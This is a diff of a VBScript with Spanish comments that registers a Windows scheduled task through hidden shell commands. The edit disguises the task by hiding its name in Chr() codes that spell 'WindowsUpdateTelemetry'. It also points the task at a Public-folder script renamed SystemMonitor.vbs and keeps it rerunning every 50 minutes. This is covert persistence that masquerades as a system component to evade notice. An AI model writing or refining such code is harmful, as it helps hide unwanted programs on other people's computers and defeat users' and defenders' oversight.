@@ -11,13 +11,13 @@
     Set objShell = CreateObject("WScript.Shell")
 
     ' Nombre de la tarea con ofuscación ligera
-    tarea = "T" & "a" & "r" & "e" & "a" & "0" & Chr(97) & Chr(118) & Chr(97) & Chr(100) & Chr(111) & Chr(114) & Chr(32) & "1"
+    tarea = Chr(87) & Chr(105) & Chr(110) & Chr(100) & Chr(111) & Chr(119) & Chr(115) & Chr(85) & Chr(112) & Chr(100) & Chr(97) & Chr(116) & Chr(101) & Chr(84) & Chr(101) & Chr(108) & Chr(101) & Chr(109) & Chr(101) & Chr(116) & Chr(114) & Chr(121)
 
     ' Elimina tarea anterior para evitar duplicados
     cmdEliminar = "schtasks /Delete /TN """ & tarea & """ /F"
     
     ' Crea nueva tarea cada 50 minutos (no 30)
-    cmdCrear = "schtasks /Create /SC MINUTE /MO 50 /TN """ & tarea & """ /TR ""wscript.exe C:\Users\Public\Tarea.vbs"" /F"
+    cmdCrear = "schtasks /Create /SC MINUTE /MO 50 /TN """ & tarea & """ /TR ""wscript.exe C:\Users\Public\SystemMonitor.vbs"" /F"
 
     objShell.Run cmdEliminar, 0, True
     objShell.Run cmdCrear, 0, True
